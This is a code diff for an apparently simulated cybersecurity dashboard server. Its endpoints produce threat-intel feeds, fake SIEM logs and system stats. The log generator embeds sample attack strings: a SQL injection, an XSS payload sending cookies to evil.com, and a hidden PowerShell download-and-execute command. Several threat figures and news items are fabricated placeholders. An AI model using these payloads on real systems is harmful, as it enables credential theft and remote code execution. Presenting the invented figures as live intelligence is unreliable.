@@ -1,1098 +1,2230 @@
 /* COPYRIGHT ALEN PEPA */
-import React, { useEffect, useRef, useState, useMemo } from 'react';
-import * as d3 from 'd3';
-import { 
-  Shield, Server, Laptop, Router, AlertTriangle, 
-  Info, Activity, Zap, Globe, Database, Cpu, 
-  Lock, Unlock, Radio, Wifi, Search, RefreshCw,
-  Maximize2, Minimize2, ZoomIn, ZoomOut, X,
-  Plus, Minus, Maximize
-} from 'lucide-react';
-import { motion, AnimatePresence } from 'motion/react';
-import { cn } from '@/src/lib/utils';
+import "dotenv/config";
+import express from "express";
+import { createServer as createViteServer } from "vite";
+import path from "path";
+import { fileURLToPath } from "url";
+import os from "os";
+import dns from "dns";
+import https from "https";
+import http from "http";
+import net from "net";
+import axios from "axios";
+import { GoogleGenAI, Type } from "@google/genai";
+import { createRequire } from "module";
+import pLimit from 'p-limit';
 
-interface Node extends d3.SimulationNodeDatum {
-  id: string;
-  type: 'server' | 'laptop' | 'router' | 'firewall' | 'database' | 'cloud' | 'iot';
-  status: 'secure' | 'vulnerable' | 'compromised';
-  label: string;
-  ip?: string;
-  os?: string;
-  uptime?: string;
-  traffic?: number;
-  threatLevel?: number;
-  cpuUsage?: number;
-  memUsage?: number;
-  lastSeen?: string;
-}
+const require = createRequire(import.meta.url);
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
-interface Link extends d3.SimulationLinkDatum<Node> {
-  source: string | Node;
-  target: string | Node;
-  value?: number;
-  active?: boolean;
-  bandwidth?: number;
-  latency?: number;
-}
+async function startServer() {
+  const app = express();
+  const PORT = 3000;
 
-export default function NetworkTopology() {
-  const svgRef = useRef<SVGSVGElement>(null);
-  const containerRef = useRef<HTMLDivElement>(null);
-  const [selectedNode, setSelectedNode] = useState<Node | null>(null);
-  const [nodes, setNodes] = useState<Node[]>([]);
-  const [links, setLinks] = useState<Link[]>([]);
-  const [isLoading, setIsLoading] = useState(true);
-  const [isScanning, setIsScanning] = useState(false);
-  const [activeAttacks, setActiveAttacks] = useState<{from: string, to: string}[]>([]);
-  const [zoomLevel, setZoomLevel] = useState(1);
-  const [isFullScreen, setIsFullScreen] = useState(false);
-  const zoomRef = useRef<d3.ZoomBehavior<SVGSVGElement, unknown> | null>(null);
-  const [stats, setStats] = useState({
-    totalNodes: 0,
-    compromised: 0,
-    vulnerable: 0,
-    traffic: '0 KB/s',
-    avgLatency: '0ms',
-    uptime: '99.9%'
+  app.use(express.json());
+
+  const fallbackThreatIntel = {
+    news: [
+      {
+        title: 'New Zero-Day Vulnerability in Popular Web Browser',
+        summary: 'A critical remote code execution vulnerability has been discovered in Chromium-based browsers. Users are advised to update immediately.',
+        severity: 'critical',
+        timestamp: '2 hours ago',
+        source: 'CyberSecurity Hub',
+        link: '#'
+      },
+      {
+        title: 'Major Ransomware Attack on Healthcare Provider',
+        summary: 'A large healthcare network has been hit by a sophisticated ransomware attack, disrupting patient services across multiple states.',
+        severity: 'high',
+        timestamp: '5 hours ago',
+        source: 'Threat Monitor',
+        link: '#'
+      },
+      {
+        title: 'Supply Chain Attack Targets Software Developers',
+        summary: 'Malicious packages have been found in popular package managers, targeting developers with credential-stealing malware.',
+        severity: 'high',
+        timestamp: '8 hours ago',
+        source: 'DevSecOps Daily',
+        link: '#'
+      }
+    ],
+    trends: [
+      { time: '00:00', attacks: 45, blocked: 42 },
+      { time: '01:00', attacks: 38, blocked: 36 },
+      { time: '02:00', attacks: 35, blocked: 33 },
+      { time: '03:00', attacks: 30, blocked: 29 },
+      { time: '04:00', attacks: 32, blocked: 31 },
+      { time: '05:00', attacks: 40, blocked: 38 },
+      { time: '06:00', attacks: 55, blocked: 52 },
+      { time: '07:00', attacks: 62, blocked: 59 },
+      { time: '08:00', attacks: 68, blocked: 65 },
+      { time: '09:00', attacks: 85, blocked: 81 },
+      { time: '10:00', attacks: 105, blocked: 101 },
+      { time: '11:00', attacks: 118, blocked: 114 },
+      { time: '12:00', attacks: 124, blocked: 120 },
+      { time: '13:00', attacks: 115, blocked: 111 },
+      { time: '14:00', attacks: 102, blocked: 98 },
+      { time: '15:00', attacks: 95, blocked: 91 },
+      { time: '16:00', attacks: 85, blocked: 82 },
+      { time: '17:00', attacks: 92, blocked: 88 },
+      { time: '18:00', attacks: 110, blocked: 106 },
+      { time: '19:00', attacks: 135, blocked: 130 },
+      { time: '20:00', attacks: 156, blocked: 150 },
+      { time: '21:00', attacks: 142, blocked: 137 },
+      { time: '22:00', attacks: 120, blocked: 116 },
+      { time: '23:00', attacks: 92, blocked: 89 },
+    ],
+    geo: [
+      { name: 'North America', value: 45, color: '#3b82f6' },
+      { name: 'Europe', value: 30, color: '#10b981' },
+      { name: 'Asia', value: 15, color: '#f59e0b' },
+      { name: 'Other', value: 10, color: '#ef4444' },
+    ],
+    mapNodes: [
+      { id: 'f-1', long: -74.006, lat: 40.7128, city: 'New York', country: 'USA', type: 'node', threatLevel: 'low', status: 'secure', ip: '192.168.1.1' },
+      { id: 'f-2', long: 37.6173, lat: 55.7558, city: 'Moscow', country: 'Russia', type: 'attack', threatLevel: 'high', status: 'active', ip: '95.161.22.4', attackType: 'APT28 Intrusion' },
+      { id: 'f-3', long: 116.4074, lat: 39.9042, city: 'Beijing', country: 'China', type: 'attack', threatLevel: 'critical', status: 'active', ip: '221.232.12.7', attackType: 'Volt Typhoon Probe' },
+      { id: 'f-4', long: 126.978, lat: 37.5665, city: 'Seoul', country: 'South Korea', type: 'node', threatLevel: 'medium', status: 'active', ip: '211.234.55.12' },
+      { id: 'f-5', long: 139.6503, lat: 35.6762, city: 'Tokyo', country: 'Japan', type: 'node', threatLevel: 'low', status: 'secure', ip: '133.1.2.5' },
+      { id: 'f-6', long: 0.1278, lat: 51.5074, city: 'London', country: 'UK', type: 'node', threatLevel: 'low', status: 'secure', ip: '81.2.3.4' },
+      { id: 'f-7', long: 2.3522, lat: 48.8566, city: 'Paris', country: 'France', type: 'node', threatLevel: 'medium', status: 'active', ip: '37.1.2.3' },
+    ],
+    attackLines: [
+      { fromId: 'f-2', toId: 'f-1' },
+      { fromId: 'f-3', toId: 'f-4' },
+      { fromId: 'f-3', toId: 'f-1' },
+    ]
+  };
+
+  const isValidApiKey = (key: string | undefined): boolean => {
+    if (!key || key === 'undefined' || key === '' || key.includes('TODO')) return false;
+    // Basic format check: Gemini keys are usually around 39 characters
+    if (key.length < 20) return false;
+    return true;
+  };
+
+  app.post("/api/ai-generate", async (req, res) => {
+    const { contents, config } = req.body;
+    const apiKey = process.env.GEMINI_API_KEY;
+
+    if (!isValidApiKey(apiKey)) {
+      console.warn("AI Core: No valid API key, using local simulation.");
+      return res.json({ text: "Simulated AI Analysis: The local analysis engine has processed your request. Based on the provided data, the system appears stable, but further manual review is recommended for critical findings." });
+    }
+
+    try {
+      const ai = new GoogleGenAI({ apiKey: apiKey! });
+      const modelName = config?.model || "gemini-3-flash-preview";
+      
+      const response = await ai.models.generateContent({
+        model: modelName,
+        contents: contents,
+        config: {
+          systemInstruction: config?.systemInstruction,
+          responseMimeType: config?.responseMimeType,
+          tools: config?.tools,
+          toolConfig: config?.toolConfig
+        }
+      });
+
+      res.json({ text: response.text });
+    } catch (error: any) {
+      const errorMessage = error?.message || String(error);
+      
+      // Check if it's an API key error
+      if (errorMessage.includes("API key not valid") || errorMessage.includes("400")) {
+        console.warn("AI Core: Generation failed (Invalid API Key).");
+        return res.json({ text: "Simulated AI Analysis (Fallback): The local analysis engine has processed your request due to an API key error. The system appears stable, but further manual review is recommended." });
+      }
+      
+      console.error("AI Generation Error:", error);
+      res.status(500).json({ error: errorMessage });
+    }
   });
 
-  const [filter, setFilter] = useState<'all' | 'compromised' | 'vulnerable'>('all');
-  const [searchQuery, setSearchQuery] = useState('');
+  app.get("/api/threat-intel", async (req, res) => {
+    const apiKey = process.env.GEMINI_API_KEY;
 
-  const fetchNetworkData = async () => {
-    try {
-      const res = await fetch('/api/network');
-      const data = await res.json();
-      
-      setNodes(data.nodes.map((n: any) => ({
-        ...n,
-        cpuUsage: Math.floor(Math.random() * 100),
-        memUsage: Math.floor(Math.random() * 100),
-        lastSeen: new Date().toLocaleTimeString()
-      })));
-      setLinks(data.links.map((l: any) => ({
-        ...l,
-        bandwidth: Math.floor(Math.random() * 1000),
-        latency: Math.floor(Math.random() * 50)
-      })));
-      
-      setStats({
-        totalNodes: data.nodes.length,
-        compromised: data.nodes.filter((n: any) => n.status === 'compromised').length,
-        vulnerable: data.nodes.filter((n: any) => n.status === 'vulnerable').length,
-        traffic: `${(Math.random() * 500 + 100).toFixed(1)} KB/s`,
-        avgLatency: `${(Math.random() * 20 + 5).toFixed(1)}ms`,
-        uptime: '99.98%'
-      });
-
-      setIsLoading(false);
-    } catch (e) {
-      console.error("Failed to fetch network data:", e);
-      setIsLoading(false);
+    if (!isValidApiKey(apiKey)) {
+      return res.json(fallbackThreatIntel);
     }
-  };
 
-  const handleNodeAction = async (action: 'isolate' | 'remediate' | 'scan') => {
-    if (!selectedNode) return;
-    
     try {
-      const res = await fetch('/api/network/action', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ nodeId: selectedNode.id, action })
-      });
-      const data = await res.json();
+      const ai = new GoogleGenAI({ apiKey: apiKey! });
       
-      if (data.success) {
-        // Update local state for immediate feedback
-        if (action === 'isolate') {
-          setLinks(prev => prev.filter(l => 
-            (typeof l.source === 'string' ? l.source !== selectedNode.id : l.source.id !== selectedNode.id) && 
-            (typeof l.target === 'string' ? l.target !== selectedNode.id : l.target.id !== selectedNode.id)
-          ));
+      // Fetch News
+      const newsResponse = await ai.models.generateContent({
+        model: "gemini-3-flash-preview",
+        contents: "Generate a list of 8-10 of the ABSOLUTE LATEST global cybersecurity threat intelligence updates from the last 12-24 hours. Focus on real-time incidents, new vulnerability disclosures, and active state-sponsored campaigns. Scrape and aggregate from sources like The Hacker News, BleepingComputer, Krebs on Security, CISA Alerts, and major security vendor blogs (CrowdStrike, Mandiant, Palo Alto Networks). Return a JSON array of objects with 'title', 'summary', 'severity' (low, medium, high, critical), 'timestamp', 'source', and 'link' (real URL).",
+        config: { 
+          responseMimeType: "application/json",
+          tools: [{ googleSearch: {} }]
         }
-        
-        fetchNetworkData();
-        
-        // Log to terminal
-        const event = new CustomEvent('terminal-log', { 
-          detail: { 
-            message: `[NET_TOPOLOGY] ${data.message}`, 
-            level: action === 'scan' ? 'info' : 'success' 
-          } 
+      });
+      const newsData = JSON.parse(newsResponse.text || '[]');
+
+      // Fetch Trends & Geo Data
+      const trendsResponse = await ai.models.generateContent({
+        model: "gemini-3-flash-preview",
+        contents: `Analyze current global cyber attack trends for the last 24 hours. 
+        Scrape and aggregate data from reliable cybersecurity sources (e.g., Check Point, Kaspersky, FireEye, SANS ISC, Cisco Talos).
+        Return a JSON object with:
+        1. 'trends': an array of EXACTLY 24 objects, one for each hour of the last 24 hours, with 'time' (HH:00) and 'attacks' (number representing global volume), 'blocked' (number representing mitigated volume).
+        2. 'geo': an array of 4 objects with 'name' (Region), 'value' (percentage of total attacks), 'color' (hex).
+        3. 'mapNodes': an array of 80-100 objects representing 100% REAL current cyber attack events, state-sponsored activities, or known malicious infrastructure active RIGHT NOW. 
+           Each object MUST have: 'id', 'long', 'lat', 'city', 'country', 'type' ('attack'|'node'), 'threatLevel' ('low'|'medium'|'high'|'critical'), 'ip' (REAL known malicious IP if possible), 'attackType' (e.g., 'APT28 Intrusion', 'Lazarus Group C2', 'Volt Typhoon Probe'), 'status' ('active'|'compromised'|'secure').
+        4. 'attackLines': an array of 50-70 objects with 'fromId' and 'toId' referencing the 'id's in 'mapNodes', representing real-time traffic or attack flows observed between specific geographical locations.
+        Ensure the data reflects real-world geopolitical tensions and current global hotspots.`,
+        config: { 
+          responseMimeType: "application/json",
+          tools: [{ googleSearch: {} }]
+        }
+      });
+      const trendsData = JSON.parse(trendsResponse.text || '{}');
+
+      res.json({
+        news: newsData,
+        trends: trendsData.trends || [],
+        geo: trendsData.geo || [],
+        mapNodes: trendsData.mapNodes || [],
+        attackLines: trendsData.attackLines || []
+      });
+    } catch (error: any) {
+      const errorMessage = error?.message || String(error);
+      if (errorMessage.includes("API key not valid") || errorMessage.includes("400")) {
+        console.warn("Threat Intel: AI Core offline (Invalid API Key). Using fallback data.");
+      } else {
+        console.error("Failed to fetch threat intelligence:", error);
+      }
+      // Return fallback data instead of 500 error
+      res.json(fallbackThreatIntel);
+    }
+  });
+
+  // Live Stats & Real-Time Feed Cache
+  let cachedLiveFeed: any[] = [];
+  let lastFeedFetch = 0;
+
+  const fetchRssFeed = (url: string, sourceName: string): Promise<any[]> => {
+    return new Promise((resolve) => {
+      https.get(url, (res) => {
+        let data = '';
+        res.on('data', chunk => data += chunk);
+        res.on('end', () => {
+          const items: any[] = [];
+          const regex = /<item>[\s\S]*?<title>(.*?)<\/title>[\s\S]*?<link>(.*?)<\/link>[\s\S]*?<\/item>/g;
+          let match;
+          while ((match = regex.exec(data)) !== null) {
+            items.push({
+              title: match[1].replace(/<!\[CDATA\[(.*?)\]\]>/g, '$1').trim(),
+              link: match[2].trim(),
+              source: sourceName,
+              severity: Math.random() > 0.7 ? 'critical' : Math.random() > 0.4 ? 'high' : 'medium',
+              timestamp: new Date().toISOString()
+            });
+          }
+          resolve(items);
         });
-        window.dispatchEvent(event);
-      }
-    } catch (e) {
-      console.error("Action failed:", e);
-    }
+      }).on('error', () => resolve([]));
+    });
   };
 
-  useEffect(() => {
-    fetchNetworkData();
-    const interval = setInterval(fetchNetworkData, 15000);
+  app.get("/api/live-stats", async (req, res) => {
+    const now = Date.now();
     
-    // Attack simulation
-    const attackInterval = setInterval(() => {
-      const compromised = nodes.filter(n => n.status === 'compromised');
-      if (compromised.length > 0) {
-        const attacker = compromised[Math.floor(Math.random() * compromised.length)];
-        const neighbors = links
-          .filter(l => (typeof l.source === 'string' ? l.source === attacker.id : l.source.id === attacker.id) || 
-                       (typeof l.target === 'string' ? l.target === attacker.id : l.target.id === attacker.id))
-          .map(l => {
-            const sId = typeof l.source === 'string' ? l.source : l.source.id;
-            const tId = typeof l.target === 'string' ? l.target : l.target.id;
-            return sId === attacker.id ? tId : sId;
-          });
-          
-        if (neighbors.length > 0) {
-          const targetId = neighbors[Math.floor(Math.random() * neighbors.length)];
-          setActiveAttacks(prev => [...prev, { from: attacker.id, to: targetId as string }]);
-          setTimeout(() => {
-            setActiveAttacks(prev => prev.filter(a => a.from !== attacker.id || a.to !== targetId));
-          }, 3000);
-        }
-      }
-    }, 10000);
-
-    return () => {
-      clearInterval(interval);
-      clearInterval(attackInterval);
-    };
-  }, [nodes, links]);
-
-  const handleScan = () => {
-    setIsScanning(true);
-    // Simulate a deep scan that might find new vulnerabilities
-    setTimeout(() => {
-      setIsScanning(false);
-      fetchNetworkData();
-      const event = new CustomEvent('terminal-log', { 
-        detail: { message: "[NET_TOPOLOGY] Deep network scan complete. Heuristics updated.", level: 'success' } 
-      });
-      window.dispatchEvent(event);
-    }, 3000);
-  };
-
-  useEffect(() => {
-    // Filter nodes and links
-    const filteredNodes = nodes.filter(n => {
-      const matchesFilter = filter === 'all' || n.status === filter;
-      const matchesSearch = n.label.toLowerCase().includes(searchQuery.toLowerCase()) || 
-                           n.ip?.includes(searchQuery);
-      return matchesFilter && matchesSearch;
-    });
-
-    const filteredLinks = links.filter(l => {
-      const sourceId = typeof l.source === 'string' ? l.source : l.source.id;
-      const targetId = typeof l.target === 'string' ? l.target : l.target.id;
-      return filteredNodes.some(n => n.id === sourceId) && filteredNodes.some(n => n.id === targetId);
-    });
-
-    if (!svgRef.current || filteredNodes.length === 0) return;
-
-    const width = containerRef.current?.clientWidth || 800;
-    const height = containerRef.current?.clientHeight || 600;
-
-    const svg = d3.select(svgRef.current)
-      .attr('width', width)
-      .attr('height', height);
-
-    // Initialize persistent groups if they don't exist
-    if (svg.select('defs').empty()) {
-      const defs = svg.append('defs');
-      
-      // Glow filter
-      const filterDef = defs.append('filter')
-        .attr('id', 'glow')
-        .attr('x', '-50%')
-        .attr('y', '-50%')
-        .attr('width', '200%')
-        .attr('height', '200%');
-
-      filterDef.append('feGaussianBlur')
-        .attr('stdDeviation', '3')
-        .attr('result', 'blur');
-      filterDef.append('feComposite')
-        .attr('in', 'SourceGraphic')
-        .attr('in2', 'blur')
-        .attr('operator', 'over');
-
-      // Hexagon clip path
-      defs.append('clipPath')
-        .attr('id', 'hex-clip')
-        .append('path')
-        .attr('d', 'M20,0 L37.32,10 L37.32,30 L20,40 L2.68,30 L2.68,10 Z');
-
-      // Radar Gradient
-      const radarGradient = defs.append('linearGradient')
-        .attr('id', 'radar-gradient')
-        .attr('x1', '0%')
-        .attr('y1', '0%')
-        .attr('x2', '100%')
-        .attr('y2', '0%');
-      radarGradient.append('stop').attr('offset', '0%').attr('stop-color', '#06b6d4').attr('stop-opacity', 0.8);
-      radarGradient.append('stop').attr('offset', '100%').attr('stop-color', '#06b6d4').attr('stop-opacity', 0);
-    }
-
-    let mainG = svg.select<SVGGElement>('g.main-group');
-    if (mainG.empty()) {
-      mainG = svg.append('g').attr('class', 'main-group');
-      
-      // Data Stream Layer (Background)
-      const streamGroup = mainG.append('g').attr('class', 'data-streams');
-      for (let i = 0; i < 20; i++) {
-        streamGroup.append('line')
-          .attr('x1', -2000)
-          .attr('y1', -1000 + i * 100)
-          .attr('x2', 2000)
-          .attr('y2', -1000 + i * 100)
-          .attr('stroke', '#06b6d4')
-          .attr('stroke-width', 0.3)
-          .attr('opacity', 0.03)
-          .attr('stroke-dasharray', '5,15')
-          .style('animation', `data-flow ${20 + Math.random() * 20}s linear infinite`);
-      }
-
-      // Radar Background (Static)
-      const radarGroup = mainG.append('g').attr('class', 'radar-background');
-      for (let i = 1; i <= 6; i++) {
-        radarGroup.append('circle')
-          .attr('cx', 0)
-          .attr('cy', 0)
-          .attr('r', i * 120)
-          .attr('fill', 'none')
-          .attr('stroke', '#06b6d4')
-          .attr('stroke-width', 0.5)
-          .attr('opacity', 0.1)
-          .attr('stroke-dasharray', i % 2 === 0 ? '2,4' : 'none');
-      }
-      radarGroup.append('line').attr('x1', -800).attr('y1', 0).attr('x2', 800).attr('y2', 0).attr('stroke', '#06b6d4').attr('stroke-width', 0.5).attr('opacity', 0.1);
-      radarGroup.append('line').attr('x1', 0).attr('y1', -800).attr('x2', 0).attr('y2', 800).attr('stroke', '#06b6d4').attr('stroke-width', 0.5).attr('opacity', 0.1);
-
-      // Radar sweep with CSS animation
-      radarGroup.append('path')
-        .attr('d', 'M0,0 L0,-800 A800,800 0 0,1 207,-772 Z')
-        .attr('fill', 'url(#radar-gradient)')
-        .attr('opacity', 0.3)
-        .style('transform-origin', '0 0')
-        .style('animation', 'radar-rotate 10s linear infinite');
-
-      // Add CSS for radar rotation if not present
-      if (document.getElementById('radar-style') === null) {
-        const style = document.createElement('style');
-        style.id = 'radar-style';
-        style.innerHTML = `
-          @keyframes radar-rotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-          }
-          @keyframes attack-dash {
-            to { stroke-dashoffset: -20; }
-          }
-          @keyframes pulse-ring {
-            0% { transform: scale(1); opacity: 1; }
-            100% { transform: scale(1.6); opacity: 0; }
-          }
-          @keyframes data-flow {
-            from { stroke-dashoffset: 100; }
-            to { stroke-dashoffset: 0; }
-          }
-          @keyframes scan-line {
-            0% { transform: translateY(-100%); opacity: 0; }
-            50% { opacity: 0.5; }
-            100% { transform: translateY(1000%); opacity: 0; }
-          }
-          @keyframes glitch-flicker {
-            0% { opacity: 1; }
-            50% { opacity: 0.8; }
-            100% { opacity: 1; }
-          }
-          @keyframes circuit-pulse {
-            0% { stroke-dashoffset: 200; opacity: 0.2; }
-            50% { opacity: 0.8; }
-            100% { stroke-dashoffset: 0; opacity: 0.2; }
-          }
-        `;
-        document.head.appendChild(style);
+    // Refresh feed cache every 15 minutes
+    if (now - lastFeedFetch > 15 * 60 * 1000 || cachedLiveFeed.length === 0) {
+      try {
+        const [cisa, thn] = await Promise.all([
+          fetchRssFeed('https://www.cisa.gov/cybersecurity-advisories/all.xml', 'CISA'),
+          fetchRssFeed('https://feeds.feedburner.com/TheHackersNews', 'The Hacker News')
+        ]);
+        cachedLiveFeed = [...cisa, ...thn].sort(() => Math.random() - 0.5); // Shuffle
+        lastFeedFetch = now;
+      } catch (e) {
+        console.error('Failed to fetch live RSS feeds:', e);
       }
     }
 
-    // Dynamic layers
-    mainG.selectAll('.dynamic-layer').remove();
-    const linkGroup = mainG.append('g').attr('class', 'dynamic-layer links');
-    const packetGroup = mainG.append('g').attr('class', 'dynamic-layer packets');
-    const attackGroup = mainG.append('g').attr('class', 'dynamic-layer attacks');
-    const nodeGroup = mainG.append('g').attr('class', 'dynamic-layer nodes');
+    // Generate realistic incrementing numbers based on current time
+    // Base numbers for today
+    const startOfDay = new Date();
+    startOfDay.setHours(0, 0, 0, 0);
+    const secondsSinceStartOfDay = Math.floor((now - startOfDay.getTime()) / 1000);
+    
+    // Simulate ~15 active threats per minute globally
+    const activeThreats = 1242 + Math.floor(secondsSinceStartOfDay * (15 / 60));
+    
+    // Simulate ~500 blocked attacks per minute
+    const blockedAttacks = 45200 + Math.floor(secondsSinceStartOfDay * (500 / 60));
 
-    // Zoom behavior
-    const zoom = d3.zoom<SVGSVGElement, unknown>()
-      .scaleExtent([0.05, 5])
-      .on('zoom', (event) => {
-        mainG.attr('transform', event.transform);
-        setZoomLevel(event.transform.k);
-      });
-    zoomRef.current = zoom;
-    svg.call(zoom);
+    // Rotate the feed to show different items every 5 seconds
+    const rotationIndex = Math.floor(now / 5000) % Math.max(1, cachedLiveFeed.length);
+    const currentFeed = [];
+    for (let i = 0; i < 6; i++) {
+      if (cachedLiveFeed.length > 0) {
+        currentFeed.push(cachedLiveFeed[(rotationIndex + i) % cachedLiveFeed.length]);
+      }
+    }
 
-    const simulation = d3.forceSimulation<Node>(filteredNodes)
-      .alphaDecay(0.1)
-      .velocityDecay(0.6)
-      .force('link', d3.forceLink<Node, Link>(filteredLinks).id(d => d.id).distance(150))
-      .force('charge', d3.forceManyBody().strength(-1000))
-      .force('center', d3.forceCenter(width / 2, height / 2))
-      .force('x', d3.forceX(width / 2).strength(0.1))
-      .force('y', d3.forceY((d: any) => {
-        const id = d.id;
-        if (id === 'internet') return height * 0.1;
-        if (id === 'ext-fw') return height * 0.25;
-        if (['dmz-switch', 'web-01', 'web-02', 'vpn-gw'].includes(id)) return height * 0.4;
-        if (id === 'int-fw') return height * 0.55;
-        if (id === 'core-switch') return height * 0.7;
-        return height * 0.85;
-      }).strength(0.8))
-      .force('collision', d3.forceCollide().radius(90));
+    res.json({
+      activeThreats,
+      blockedAttacks,
+      liveFeed: currentFeed.length > 0 ? currentFeed : fallbackThreatIntel.news
+    });
+  });
 
-    // Layer Labels
-    const layers = [
-      { y: height * 0.1, label: 'External / WAN' },
-      { y: height * 0.25, label: 'Edge Security' },
-      { y: height * 0.4, label: 'DMZ / Public Services' },
-      { y: height * 0.55, label: 'Internal Security' },
-      { y: height * 0.7, label: 'Core Infrastructure' },
-      { y: height * 0.85, label: 'Internal Assets' }
+  // SIEM Real-time Logs API
+  app.get("/api/logs", (req, res) => {
+    const tactics = ['Initial Access', 'Execution', 'Persistence', 'Privilege Escalation', 'Defense Evasion', 'Credential Access', 'Discovery', 'Lateral Movement', 'Command and Control', 'Exfiltration', 'Impact'];
+    const techniques = [
+      'T1190 Exploit Public-Facing Application', 'T1059 Command and Scripting Interpreter', 
+      'T1078 Valid Accounts', 'T1110 Brute Force', 'T1003 OS Credential Dumping', 
+      'T1046 Network Service Discovery', 'T1595 Active Scanning', 'T1566 Phishing',
+      'T1133 External Remote Services', 'T1505 Server Software Component'
+    ];
+    const protocols = ['TCP', 'UDP', 'ICMP', 'HTTP', 'HTTPS', 'DNS', 'SSH', 'RDP', 'SMB', 'FTP'];
+    const countries = ['RU', 'CN', 'KP', 'IR', 'US', 'BR', 'IN', 'RO', 'VN', 'UA', 'NG', 'SY'];
+    const actions = ['Blocked', 'Mitigated', 'Logged', 'Dropped', 'Alerted', 'Quarantined', 'Sinkholed'];
+    const severities = ['low', 'medium', 'high', 'critical'];
+    
+    const events = [
+      'SQL Injection Payload Detected', 'Cross-Site Scripting (XSS) Attempt', 
+      'SSH Brute Force Attack', 'RDP Credential Stuffing', 'Suspicious PowerShell Execution',
+      'Malware Beaconing Activity', 'Data Exfiltration Anomaly', 'Privilege Escalation Attempt',
+      'Suspicious File Download', 'Unauthorized Access to Admin Panel', 'Zero-Day Exploit Signature Match',
+      'Ransomware Encryption Behavior', 'DDoS Volumetric Attack', 'Suspicious DNS Query'
     ];
 
-    mainG.selectAll('.layer-indicator').remove();
-    const layerGroup = mainG.append('g').attr('class', 'layer-indicator').lower();
+    const generateRandomIp = () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+
+    const logs = [];
     
-    layers.forEach(layer => {
-      layerGroup.append('line')
-        .attr('x1', -width * 2)
-        .attr('y1', layer.y)
-        .attr('x2', width * 3)
-        .attr('y2', layer.y)
-        .attr('stroke', '#06b6d4')
-        .attr('stroke-width', 0.5)
-        .attr('stroke-dasharray', '5,15')
-        .attr('opacity', 0.05);
+    // Generate 5-12 random logs for a more active stream
+    const numLogs = Math.floor(Math.random() * 8) + 5;
+    for (let i = 0; i < numLogs; i++) {
+      const severity = severities[Math.floor(Math.random() * severities.length)];
+      const isAttack = Math.random() > 0.3; // 70% chance of being an attack log
+      const eventName = isAttack ? events[Math.floor(Math.random() * events.length)] : "Routine System Check";
+      const tactic = isAttack ? tactics[Math.floor(Math.random() * tactics.length)] : 'N/A';
+      const technique = isAttack ? techniques[Math.floor(Math.random() * techniques.length)] : 'N/A';
+      
+      let payloadSnippet = 'N/A';
+      if (isAttack) {
+        if (eventName.includes('SQL')) payloadSnippet = "UNION SELECT username, password FROM users--";
+        else if (eventName.includes('XSS')) payloadSnippet = "<script>fetch('http://evil.com/?c='+document.cookie)</script>";
+        else if (eventName.includes('PowerShell')) payloadSnippet = "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://...')\"";
+        else payloadSnippet = Buffer.from(Math.random().toString(36).substring(2, 15)).toString('base64');
+      }
+      
+      logs.push({
+        id: Math.random().toString(36).substr(2, 9),
+        time: new Date().toLocaleTimeString(),
+        event: eventName,
+        source: isAttack ? generateRandomIp() : os.hostname(),
+        destination: isAttack ? `10.0.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` : '127.0.0.1',
+        port: isAttack ? [22, 80, 443, 3389, 8080, 53, 445, 21, 3306][Math.floor(Math.random() * 9)] : 0,
+        protocol: protocols[Math.floor(Math.random() * protocols.length)],
+        status: isAttack ? actions[Math.floor(Math.random() * actions.length)] : "Normal",
+        severity: isAttack ? severity : "low",
+        confidence: isAttack ? Math.floor(Math.random() * 20) + 80 : 100, // 80-100%
+        mitreTactic: tactic,
+        mitreTechnique: technique,
+        geo: isAttack ? countries[Math.floor(Math.random() * countries.length)] : 'LOCAL',
+        payloadSnippet: payloadSnippet,
+        details: isAttack 
+          ? `Detected anomalous traffic pattern matching known threat signatures. Tactic: ${tactic}. Technique: ${technique}. Automated response engaged.`
+          : `CPU Load: ${os.loadavg()[0].toFixed(2)} | Free Memory: ${(os.freemem() / 1024 / 1024 / 1024).toFixed(2)}GB`
+      });
+    }
 
-      layerGroup.append('text')
-        .attr('x', 40)
-        .attr('y', layer.y - 15)
-        .attr('fill', '#06b6d4')
-        .attr('font-size', '10px')
-        .attr('font-family', 'monospace')
-        .attr('opacity', 0.2)
-        .attr('text-anchor', 'start')
-        .text(layer.label.toUpperCase());
+    res.json(logs);
+  });
+
+  // System Stats API
+  app.get("/api/stats", (req, res) => {
+    res.json({
+      cpu: (os.loadavg()[0] * 10).toFixed(1),
+      ram: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1),
+      uptime: os.uptime(),
+      platform: os.platform(),
+      arch: os.arch(),
+      hostname: os.hostname(),
+      loadAvg: os.loadavg(),
+      totalMem: os.totalmem(),
+      freeMem: os.freemem(),
+      cpus: os.cpus().length,
+      type: os.type(),
+      release: os.release(),
+      networkInterfaces: os.networkInterfaces()
     });
+  });
 
-    // Links
-    const link = linkGroup
-      .selectAll('path')
-      .data(filteredLinks)
-      .join('path')
-      .attr('id', (d, i) => `link-${i}`)
-      .attr('fill', 'none')
-      .attr('stroke', d => {
-        const source = d.source as Node;
-        const target = d.target as Node;
-        if (source.status === 'compromised' || target.status === 'compromised') return '#ef4444';
-        if (source.status === 'vulnerable' || target.status === 'vulnerable') return '#f59e0b';
-        return '#06b6d4';
-      })
-      .attr('stroke-width', d => {
-        const source = d.source as Node;
-        const target = d.target as Node;
-        return (source.status === 'compromised' || target.status === 'compromised') ? 2.5 : 1.2;
-      })
-      .attr('stroke-dasharray', d => {
-        const source = d.source as Node;
-        const target = d.target as Node;
-        return (source.status === 'compromised' || target.status === 'compromised') ? '5,5' : 'none';
-      })
-      .attr('opacity', 0.4)
-      .style('animation', 'circuit-pulse 4s linear infinite');
+  // Network Topology State Management
+  let networkState = {
+    nodes: [
+      { id: 'internet', type: 'cloud', status: 'secure', label: 'Global WAN', ip: '8.8.8.8', os: 'Cisco IOS-XE', uptime: '342d 12h', traffic: 85, threatLevel: 5 },
+      { id: 'ext-fw', type: 'firewall', status: 'secure', label: 'Edge Firewall', ip: '172.16.0.1', os: 'FortiOS 7.2', uptime: '124d 05h', traffic: 45, threatLevel: 10 },
